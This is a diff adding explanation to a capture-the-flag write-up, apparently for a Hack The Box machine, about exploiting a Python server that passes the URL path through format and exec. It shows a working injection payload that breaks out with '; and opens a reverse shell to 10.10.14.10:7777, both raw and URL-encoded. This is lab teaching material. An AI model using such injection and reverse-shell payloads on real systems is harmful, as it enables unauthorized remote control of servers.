@@ -128,10 +128,15 @@ Got a directory named develop;visiting  /develop/supersecureserver.py gives a py
 Looking through the script a line of code inside the ***ServeDoc*** function looks appealing, 
 ![placeholder](/writeup/assets/img/obscurity/script.png "script")
 The path variable goes through the exec function,this can be used to perform remote code execution.
+
+The string in path variable goes through the *format* function first and then the exec function runs.So whatever is the path it goes to become a string as "output = path"; then exec function executes and creates a variable named **output** and assigns it the value *path*.That means a string is created using format fuction and since that string is in control of us, we can provide more command inside it that will be then executed through exec.
 The following payload exploits this line of code
 ```bash
 Payload='; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.10',7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']); #
 ```
+This payload works as
+* First finish the command that assigns the output with **';**
+* Next, it provides another command that we want to execute(Here,reverse shell)
 URL Encode the payload and then putting it in url gives a reverse shell.
 ```url
 http://10.10.10.168:8080/%27%3B%20s%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%2710%2E10%2E14%2E10%27%2C7777%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%27%2Fbin%2Fsh%27%2C%27%2Di%27%5D%29%3B%20%23  
